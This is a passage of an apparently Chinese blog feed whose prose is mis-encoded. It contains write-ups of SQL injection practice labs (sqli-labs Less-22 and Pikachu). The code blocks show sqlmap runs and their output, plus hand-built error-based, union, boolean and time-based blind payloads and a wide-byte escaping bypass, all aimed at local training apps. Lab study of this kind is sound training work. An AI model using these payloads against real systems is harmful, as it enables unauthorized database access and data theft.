åœ°ï¼Œå¾€å¾€è¦ç»è¿‡å¤šä¸ªè·¯ç”±è®¾å¤‡ï¼Œç”±äºä¸åŒçš„è®¾å¤‡å¯¹å­—ç¬¦çš„å¤„ç†æ–¹å¼æœ‰ä¸€äº›ä¸åŒï¼Œè¿™æ ·é‚£äº›ä¸å¯è§å­—ç¬¦å°±æœ‰å¯èƒ½è¢«å¤„ç†é”™è¯¯ï¼Œè¿™æ˜¯ä¸åˆ©äºä¼ è¾“çš„ã€‚æ‰€ä»¥å°±å…ˆæŠŠæ•°æ®å…ˆåšä¸€ä¸ª Base64 ç¼–ç ï¼Œç»Ÿç»Ÿå˜æˆå¯è§å­—ç¬¦ï¼Œè¿™æ ·å‡ºé”™çš„å¯èƒ½æ€§å°±å¤§é™ä½äº†ã€‚</p><hr><h1 id="less-22"><a class="markdownIt-Anchor" href="#less-22">#</a> Less-22</h1><p>dateï¼š2020-11-22 11:35:53</p><h2 id="è¿‡ç¨‹-22"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-22">#</a> è¿‡ç¨‹</h2><h3 id="sqlmap-22"><a class="markdownIt-Anchor" href="#sqlmap-22">#</a> sqlmap</h3><p>bp æŠ“åŒ…å³é”® copy to file ç”Ÿæˆ 22.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 22.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure><p>åç»­åŒ less-11</p><h3 id="æ‰‹å·¥æ³¨å…¥-22"><a class="markdownIt-Anchor" href="#æ‰‹å·¥æ³¨å…¥-22">#</a> æ‰‹å·¥æ³¨å…¥</h3><p>è¿˜æ˜¯ç”¨ admin\1 ç™»å½•ï¼Œæ˜¾ç¤º cookieï¼Œé‚£å°±è¿˜æ˜¯ cookie æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0YOUR IP ADDRESS IS : 127.0.0.1DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIREYOUR COOKIE : uname = YWRtaW4= and expires: Sun 22 Nov 2020 - 12:37:26Your Login name:adminYour Password:1Your ID:8</span><br></pre></td></tr></table></figure><p>çœ‹è§ uname = YWRtaW4= ï¼Œé‚£å°±åº”è¯¥è¿˜æ˜¯ç”¨ base64 åŠ å¯†</p><p>ä½¿ç”¨ä¸Šä¸€é¢˜çš„ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ˜æ–‡ï¼šadmin&#x27;) and extractvalue(1,concat(&#x27;,&#x27;,database())) # base64ï¼šYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=</span><br></pre></td></tr></table></figure><p>å‘ç°æ²¡æœ‰æŠ¥é”™æ˜¾ç¤ºï¼Œé‚£ä¹ˆè¯´æ˜æ²¡æœ‰é—­åˆæˆåŠŸï¼Œçœ‹æ ‡é¢˜æ˜¯åŒå¼•å·é—­åˆï¼Œé‚£å°±æ”¹ä¸€ä¸‹å¼•å·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ˜æ–‡ï¼šadmin&quot;) and extractvalue(1,concat(&#x27;,&#x27;,database())) # base64ï¼šYWRtaW4iKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;) and extractvalue(1,concat(&#x27;,&#x27;,database())) # &quot; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><p>å“ªåˆ°åé¢çš„ sql è¯­å¥ï¼Œå‘ç°åªéœ€è¦é—­åˆä¸€ä¸ªåŒå¼•å·ï¼Œä¸éœ€è¦ï¼‰ï¼Œå¼€å¹²</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ˜æ–‡ï¼šadmin&quot; and extractvalue(1,concat(&#x27;,&#x27;,database())) # base64ï¼šYWRtaW4iIGFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoJywnLGRhdGFiYXNlKCkpKSAjIA==</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Issue with your mysql: XPATH syntax error: &#x27;,security&#x27;</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°æ•°æ®åº“åï¼Œæ‹¿åˆ«çš„æ•°æ®åŒ less-11</p><h2 id="æ€»ç»“-22"><a class="markdownIt-Anchor" href="#æ€»ç»“-22">#</a> æ€»ç»“</h2><p>æˆ‘å‘ç° sqlmap è·‘å¾—æœ‰ä¸€ç‚¹æ…¢</p>]]></content>
      
      
      <categories>
          
          <category> å¤§å†’é™© </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlæ³¨å…¥é¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachuå¤§å†’é™©é¸­</title>
      <link href="/2020/10/30/dmx/pikachu%E5%A4%A7%E5%86%92%E9%99%A9%E9%B8%AD/"/>
      <url>/2020/10/30/dmx/pikachu%E5%A4%A7%E5%86%92%E9%99%A9%E9%B8%AD/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlæ³¨å…¥"><a class="markdownIt-Anchor" href="#sqlæ³¨å…¥">#</a> SQL æ³¨å…¥</h1><h2 id="æœç´¢å‹æ³¨å…¥"><a class="markdownIt-Anchor" href="#æœç´¢å‹æ³¨å…¥">#</a> æœç´¢å‹æ³¨å…¥</h2><p><strong>è¿‡ç¨‹</strong></p><p><img src="pikachu-sql-001.png" alt=""></p><p>çˆ†å‡ºæ•°æ®åº“ï¼Œç¡®å®šäº†æ˜¯ä¸‰ä¸ªå­—æ®µè¾“å‡º<img src="pikachu-sql-002.png" alt=""></p><hr><h2 id="xxå‹æ³¨å…¥"><a class="markdownIt-Anchor" href="#xxå‹æ³¨å…¥">#</a> xx å‹æ³¨å…¥</h2><p><strong>è¿‡ç¨‹</strong></p><p>æˆ‘æ˜¯æƒ³çœ‹æŠ¥é”™ä¿¡æ¯çš„ï¼Œä¸‰ä¸ªå•å¼•å·ï¼Œç»“æœè«åå…¶å¦™å°±è¿‡äº†</p><p>pyloadï¼š<a href="http://www.pikachu.com/vul/sqli/sqli_x.php">http://www.pikachu.com/vul/sqli/sqli_x.php</a><br>?name=â€™â€™â€™) union select 1,database() %23<br>&amp;submit=%E6%9F%A5%E8%AF%A2</p><p>å“¦ï¼Œåˆšåˆšè¯•äº†ä¸‹ï¼Œä¸€ä¸ªå•å¼•å·å°±è¿‡äº†ï¼Œä¹‹æ‰€ä»¥â•ï¼‰ï¼Œæ˜¯å› ä¸ºçœ‹æŠ¥é”™ä¿¡æ¯çš„æ—¶å€™å‘ç°æœ€åé¢æœ‰ä¸€ä¸ªï¼‰ï¼Œæ‰€ä»¥æƒ³åˆ°å°æ‹¬å·å¯èƒ½æ²¡æœ‰é—­åˆ</p><p><img src="pikachu-sql-003.png" alt=""></p><hr><h2 id="insertupdateæ³¨å…¥"><a class="markdownIt-Anchor" href="#insertupdateæ³¨å…¥">#</a> &quot;insert/update&quot; æ³¨å…¥</h2><p><strong>è¿‡ç¨‹</strong></p><p>è¯•æŠ¥é”™ï¼Œçœ‹å…·ä½“è¯­å¥</p><p><img src="pikachu-sql-004.png" alt=""></p><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;,md5(&#x27;a&#x27;),&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;)&#x27; at line 1</span><br></pre></td></tr></table></figure><p>å¯†ç éšä¾¿è¾“ï¼Œæ„é€ ç”¨æˆ·å payloadï¼Œæ³¨æ„æ—¶é—´æ³¨å…¥çš„æ—¶å€™è¦æ‹¬å·èµ·æ¥ï¼Œä¸ç„¶ä¼šæŠ¥é”™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;,&#x27;admin&#x27;,&#x27;&#x27;,(select sleep(10)),&#x27;&#x27;,&#x27;&#x27;) # </span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šå·®ä¸å¤šæ•°æ®åº“æ‰§è¡Œçš„è¯­å¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into a(1,2,3,4,5,6) values(&#x27; admin&#x27;,&#x27;admin&#x27;,&#x27;&#x27;,(select sleep(10)),&#x27;&#x27;,&#x27;&#x27;) # &#x27;,&#x27;md5(admin)&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;  );</span><br></pre></td></tr></table></figure><p>æ³¨å†ŒæˆåŠŸï¼Œæœ€åä¹Ÿä¸æ™“å¾—è¿™ä¸ªæ³¨å…¥æœ‰åŠ³èµ„ç”¨ï¼Ÿè€Œä¸”ç™»é™†çš„æ—¶å€™æ£€æŸ¥å¯†ç ä¹Ÿæ˜¯ md5 åŠ å¯†ä¸€ä¸‹çš„â€¦</p><p>ç„¶åç™»é™†çš„æ—¶å€™ï¼Œæºä»£ç è¿˜æŠ¥é”™æƒ¹</p><p>æ—¶éš”å‡ å¤©ï¼Œæˆ‘çªç„¶æƒ³èµ·æ¥ï¼Œæ—¢ç„¶å¯ä»¥æ³¨å…¥é‚£ä¹ˆå°±èƒ½æ—¶é—´ç›²æ³¨è¿›è¡Œåˆ¤æ–­â€¦</p><hr><h2 id="deleteæ³¨å…¥"><a class="markdownIt-Anchor" href="#deleteæ³¨å…¥">#</a> delete æ³¨å…¥</h2><p><strong>è¿‡ç¨‹</strong></p><p>å‘ç°åˆ é™¤çš„æ—¶å€™æ˜¯ get è¯·æ±‚ï¼Œå‚æ•° idï¼Œç›´æ¥ sqlmap æ³¡ä¸€æ³¡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">D:\othertools\sqlmap-py&gt;python sqlmap.py -u http://www.pikachu.com/vul/sqli/sqli_del.php?id=57 --dbs --batch</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[&quot;]_____ ___ ___  &#123;1.4.9.8#dev&#125;</span><br><span class="line">|_ -| . [.]     | .&#x27;| . |</span><br><span class="line">|___|_  [&#x27;]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 10:11:16 /2020-11-04/</span><br><span class="line"></span><br><span class="line">[10:11:16] [INFO] resuming back-end DBMS &#x27;mysql&#x27;</span><br><span class="line">[10:11:17] [INFO] testing connection to the target URL</span><br><span class="line">you have not declared cookie(s), while server wants to set its own (&#x27;PHPSESSID=3q2hir937ep...ecom1vat5s&#x27;). Do you want to use those [Y/n] Y</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (original value)</span><br><span class="line">    Payload: id=(SELECT (CASE WHEN (2154=2154) THEN 61 ELSE (SELECT 6834 UNION SELECT 3017) END))</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: id=61 AND (SELECT 5347 FROM(SELECT COUNT(*),CONCAT(0x716b717671,(SELECT (ELT(5347=5347,1))),0x7162627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id=61 AND (SELECT 9106 FROM (SELECT(SLEEP(5)))xjCI)</span><br><span class="line">---</span><br><span class="line">[10:11:19] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web application technology: PHP, PHP 7.3.4, Apache 2.4.39</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0</span><br><span class="line">[10:11:19] [INFO] fetching database names</span><br><span class="line">[10:11:19] [INFO] resumed: &#x27;information_schema&#x27;</span><br><span class="line">[10:11:19] [INFO] resumed: &#x27;bookstore&#x27;</span><br><span class="line">[10:11:19] [INFO] resumed: &#x27;dvwa&#x27;</span><br><span class="line">[10:11:19] [INFO] resumed: &#x27;edusys&#x27;</span><br><span class="line">[10:11:19] [INFO] resumed: &#x27;exam&#x27;</span><br><span class="line">[10:11:19] [INFO] resumed: &#x27;fresh&#x27;</span><br><span class="line">[10:11:19] [INFO] resumed: &#x27;hotel&#x27;</span><br><span class="line">[10:11:19] [INFO] resumed: &#x27;hy&#x27;</span><br><span class="line">[10:11:19] [INFO] resumed: &#x27;hy2&#x27;</span><br><span class="line">[10:11:19] [INFO] resumed: &#x27;mysql&#x27;</span><br><span class="line">[10:11:19] [INFO] resumed: &#x27;news&#x27;</span><br><span class="line">[10:11:19] [INFO] resumed: &#x27;pentest&#x27;</span><br><span class="line">[10:11:19] [INFO] resumed: &#x27;performance_schema&#x27;</span><br><span class="line">[10:11:19] [INFO] resumed: &#x27;pikachu&#x27;</span><br><span class="line">[10:11:19] [INFO] resumed: &#x27;store&#x27;</span><br><span class="line">[10:11:19] [INFO] resumed: &#x27;student&#x27;</span><br><span class="line">[10:11:19] [INFO] resumed: &#x27;test&#x27;</span><br><span class="line">[10:11:19] [INFO] resumed: &#x27;vote&#x27;</span><br><span class="line">available databases [18]:</span><br><span class="line">[*] bookstore</span><br><span class="line">[*] dvwa</span><br><span class="line">[*] edusys</span><br><span class="line">[*] exam</span><br><span class="line">[*] fresh</span><br><span class="line">[*] hotel</span><br><span class="line">[*] hy</span><br><span class="line">[*] hy2</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] news</span><br><span class="line">[*] pentest</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] pikachu</span><br><span class="line">[*] store</span><br><span class="line">[*] student</span><br><span class="line">[*] test</span><br><span class="line">[*] vote</span><br><span class="line"></span><br><span class="line">[10:11:19] [INFO] fetched data logged to text files under &#x27;C:\Users\lenovo\AppData\Local\sqlmap\output\www.pikachu.com&#x27;</span><br></pre></td></tr></table></figure><hr><h2 id="httpå¤´æ³¨å…¥æœªè§£å†³"><a class="markdownIt-Anchor" href="#httpå¤´æ³¨å…¥æœªè§£å†³">#</a> http å¤´æ³¨å…¥ï¼ˆæœªè§£å†³ï¼‰</h2><p><strong>è¿‡ç¨‹</strong></p><p>ç”¨æç¤ºé‡Œé¢çš„è´¦æˆ·å¯†ç åç™»å½•ï¼Œæ˜¾ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ä½ çš„ipåœ°å€:127.0.0.1</span><br><span class="line"></span><br><span class="line">ä½ çš„user agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0</span><br><span class="line"></span><br><span class="line">ä½ çš„http accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">ä½ çš„ç«¯å£ï¼ˆæœ¬æ¬¡è¿æ¥ï¼‰:tcp14766</span><br></pre></td></tr></table></figure><p>è¯´æ˜è¿™äº›å¤´ä¿¡æ¯å¯èƒ½éƒ½è¢«å­˜è¿›æ•°æ®åº“äº†ï¼Œå¯ä»¥è¿›è¡Œ sql æ³¨å…¥</p><p>ç”¨ bp æŠ“åˆ°çš„åŒ…ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /vul/sqli/sqli_header/sqli_header_login.php HTTP/1.1</span><br><span class="line">Host: www.pikachu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://www.pikachu.com/vul/sqli/sqli_header/sqli_header_login.php</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 34</span><br><span class="line">Origin: http://www.pikachu.com</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=1h9tm55rqj71244okk7do3ch0q</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">username=a&amp;password=a&amp;submit=Login</span><br></pre></td></tr></table></figure><p>åˆ æ‰ä¸€ä¸ªåŠ å•å¼•å·ï¼Œæ²¡æŠ¥é”™ï¼Œç”¨ç½‘ä¸Šçš„ payload ä¹Ÿä¸æŠ¥é”™ï¼Œç¥äº†ä¸ªå¥‡ï¼š</p><p><img src="pikachu-sql-005.png" alt=""></p><hr><h2 id="ç›²æ³¨base-on-boolean"><a class="markdownIt-Anchor" href="#ç›²æ³¨base-on-boolean">#</a> ç›²æ³¨ (base  on boolean)</h2><p><strong>è¿‡ç¨‹</strong></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.pikachu.com/vul/sqli/sqli_blind_b.php</span><br><span class="line">?name=lili&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure><p>æ­£å¸¸è¾“å‡ºï¼š</p><p><img src="pikachu-sql-006.png" alt=""></p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.pikachu.com/vul/sqli/sqli_blind_b.php</span><br><span class="line">?name=lili&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line">&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ‚¨è¾“å…¥çš„usernameä¸å­˜åœ¨ï¼Œè¯·é‡æ–°è¾“å…¥ï¼</span><br></pre></td></tr></table></figure><p>å¯èƒ½æ˜¯å› ä¸ºåªèƒ½è¾“å‡ºä¸€ä¸ªå¯¹è±¡ï¼Œpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.pikachu.com/vul/sqli/sqli_blind_b.php?name=lilijmknh&#x27; union select database(), &#x27;1&#x27;=&#x27;1&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure><p>çˆ†å‡ºæ•°æ®åº“ï¼Œç¡®å®šæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œä¸¤ä¸ªå­—æ®µï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your uid:pikachuyour email is: 1</span><br></pre></td></tr></table></figure><p>çˆ†è¡¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.pikachu.com/vul/sqli/sqli_blind_b.php?name=lilijmknh&#x27; union select database(), group_concat(table_name)  from information_schema.tables where table_schema = &#x27;pikachu&#x27; and &#x27;1&#x27;=&#x27;1&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><figcaption><span>uid:pikachu</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your email is: httpinfo,member,message,users,xssblind</span><br></pre></td></tr></table></figure><p>çˆ†å‡ºå­—æ®µï¼š</p><figure class="highlight plaintext"><figcaption><span>email is: id,userid,ipaddress,useragent,httpaccept,remoteport</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your email is: id,userid,ipaddress,useragent,httpaccept,remoteport</span><br></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡ group_concat () åˆ†åˆ«è¾“å‡ºæ¯ä¸ªå­—æ®µæ‰€æœ‰çš„å€¼ï¼Œpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=lilijmknh&#x27; union select database(),group_concat(id) from httpinfo where &#x27;1&#x27;=&#x27;1&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your uid:pikachuyour email is: 42,43,44,45,46,47</span><br></pre></td></tr></table></figure><hr><h2 id="ç›²æ³¨base-on-timeæœªæˆåŠŸå®ç°-500"><a class="markdownIt-Anchor" href="#ç›²æ³¨base-on-timeæœªæˆåŠŸå®ç°-500">#</a> ç›²æ³¨ (base on time)ï¼ŒæœªæˆåŠŸå®ç° ï¼Œ500</h2><p>è¿™ä¸ªå°±æ˜¯åˆ©ç”¨äºŒåˆ†æ³•æŸ¥ ascii ç å€¼ï¼Œæ‰‹å·¥æ³¨å…¥çš„è¯å¾ˆè´¹æ—¶é—´çš„æŠŠ</p><p>é ï¼Œä»–æ ¹æœ¬å°±ä¸å…³å¿ƒæˆ‘æ˜¯è°ï¼æˆ‘è¦å»çœ‹æºç äº†ï¼</p><p>å‘ç°æœç„¶æ˜¯ç›²æ³¨ï¼Œä¸ç®¡æ˜¯ä¸æ˜¯æŸ¥åˆ°ï¼Œéƒ½æ˜¯è¾“å‡º i donâ€™t care who you are!</p><p><strong>è¿‡ç¨‹</strong></p><p>payloadï¼ŒæŠ¥ 500 äº†:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.pikachu.com/vul/sqli/sqli_blind_t.php?name=&#x27; or (length(database())&gt;1 and sleep(10)) and &#x27;1&#x27;=&#x27;1&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure><hr><h2 id="å®½å­—èŠ‚æ³¨å…¥"><a class="markdownIt-Anchor" href="#å®½å­—èŠ‚æ³¨å…¥">#</a> å®½å­—èŠ‚æ³¨å…¥</h2><p><a href="https://www.cnblogs.com/Rain99-/p/10583406.html">è¯¦è§£</a></p><ol><li>å­—ç¬¦ã€å­—ç¬¦é›†<br>å­—ç¬¦ (character) æ˜¯ç»„æˆå­—ç¬¦é›† (character set) çš„åŸºæœ¬å•ä½ã€‚å¯¹å­—ç¬¦èµ‹äºˆä¸€ä¸ªæ•°å€¼ (encoding) æ¥ç¡®å®šè¿™ä¸ªå­—ç¬¦åœ¨è¯¥å­—ç¬¦é›†ä¸­çš„ä½ç½®ã€‚</li><li>UTF8<br> ç”±äº ASCII è¡¨ç¤ºçš„å­—ç¬¦åªæœ‰ 128 ä¸ªï¼Œå› æ­¤ç½‘ç»œä¸–ç•Œçš„è§„èŒƒæ˜¯ä½¿ç”¨ UNICODE ç¼–ç ï¼Œä½†æ˜¯ç”¨ ASCII è¡¨ç¤ºçš„å­—ç¬¦ä½¿ç”¨ UNICODE å¹¶ä¸é«˜æ•ˆã€‚å› æ­¤å‡ºç°äº†ä¸­é—´æ ¼å¼å­—ç¬¦é›†ï¼Œè¢«ç§°ä¸ºé€šç”¨è½¬æ¢æ ¼å¼ï¼ŒåŠ UTF (Universal Transformation Format)ã€‚</li><li>å®½å­—èŠ‚<br> GB2312ã€GBKã€GB18030ã€BIG5ã€Shift_JIS ç­‰è¿™äº›éƒ½æ˜¯å¸¸è¯´çš„å®½å­—èŠ‚ï¼Œå®é™…ä¸Šåªæœ‰ä¸¤å­—èŠ‚ã€‚å®½å­—èŠ‚å¸¦æ¥çš„å®‰å…¨é—®é¢˜ä¸»è¦æ˜¯åƒ ASCII å­—ç¬¦ (ä¸€å­—èŠ‚) çš„ç°è±¡ï¼Œå³å°†ä¸¤ä¸ª ascii å­—ç¬¦è¯¯è®¤ä¸ºæ˜¯ä¸€ä¸ªå®½å­—èŠ‚å­—ç¬¦ã€‚</li></ol><p>å®½å­—èŠ‚æ³¨å…¥åŸç†ï¼š</p><blockquote><p>GBK å ç”¨ä¸¤å­—èŠ‚</p><p>ASCII å ç”¨ä¸€å­—èŠ‚</p><p>PHP ä¸­ç¼–ç ä¸º GBKï¼Œå‡½æ•°æ‰§è¡Œæ·»åŠ çš„æ˜¯ ASCII ç¼–ç ï¼ˆæ·»åŠ çš„ç¬¦å·ä¸º â€œ\â€ï¼‰ï¼ŒMYSQL é»˜è®¤å­—ç¬¦é›†æ˜¯ GBK ç­‰å®½å­—èŠ‚å­—ç¬¦é›†ã€‚</p><p>å¤§å®¶éƒ½çŸ¥é“ % dfâ€™ è¢« PHP è½¬ä¹‰ï¼ˆå¼€å¯ GPCã€ç”¨ addslashes å‡½æ•°ï¼Œæˆ–è€… icov ç­‰ï¼‰ï¼Œå•å¼•å·è¢«åŠ ä¸Šåæ–œæ  \ï¼Œå˜æˆäº† % df\â€™ï¼Œå…¶ä¸­ \ çš„åå…­è¿›åˆ¶æ˜¯ %5C ï¼Œé‚£ä¹ˆç°åœ¨  <code>%df\â€™</code>  = <code>%df%5c%27</code> ï¼Œå¦‚æœç¨‹åºçš„é»˜è®¤å­—ç¬¦é›†æ˜¯ GBK ç­‰å®½å­—èŠ‚å­—ç¬¦é›†ï¼Œåˆ™ MySQL ç”¨ GBK çš„ç¼–ç æ—¶ï¼Œä¼šè®¤ä¸º  <code>%df%5c</code>  æ˜¯ä¸€ä¸ªå®½å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯ <code>ç¸—</code> ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š% df\â€™ = % df%5c%27 